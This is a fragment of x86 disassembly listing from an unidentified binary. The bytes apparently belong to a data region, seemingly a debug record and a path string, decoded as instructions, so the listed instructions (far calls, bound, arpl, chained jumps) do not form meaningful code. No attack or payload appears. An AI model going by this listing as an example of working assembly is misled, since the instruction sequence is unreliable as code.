  4348b2:	add    BYTE PTR [edx+0x0],bl
  4348b5:	dec    esp
  4348b6:	add    BYTE PTR [ebx+0x0],cl
  4348b9:	add    BYTE PTR [eax],al
  4348bb:	dec    ecx
  4348bc:	add    BYTE PTR [ebp+0x0],dl
  4348bf:	dec    edi
  4348c0:	add    BYTE PTR [eax],al
  4348c2:	add    BYTE PTR [edx+0x53],dl
  4348c5:	inc    esp
  4348c6:	push   ebx
  4348c7:	xor    al,0x31
  4348c9:	imul   BYTE PTR [esi]
  4348cb:	xor    ebx,esi
  4348cd:	scas   eax,DWORD PTR es:[edi]
  4348ce:	dec    esi
  4348cf:	call   0xed45:0xda6e26e1
  4348d6:	adc    BYTE PTR [edx],bl
  4348d8:	add    BYTE PTR [eax],al
  4348da:	add    BYTE PTR [ebx+0x3a],dl
  4348dd:	pop    esp
  4348de:	popa   
  4348df:	jbe    0x434956
  4348e1:	jns    0x434950
  4348e3:	dec    ecx
  4348e4:	jb     0x434960
  4348e6:	pop    esp
  4348e7:	bound  di,DWORD PTR [edx+0x52]
  4348eb:	gs fs push ax
  4348ef:	arpl   WORD PTR [esi+0x5c],si
  4348f2:	js     0x43494e
  4348f4:	je     0x43493d
  4348f6:	jno    0x43493a
  4348f8:	jno    0x434961
  4348fa:	bound  ebp,QWORD PTR [esi]
  4348fc:	jo     0x434962
  4348fe:	bound  eax,QWORD PTR [eax]
	...
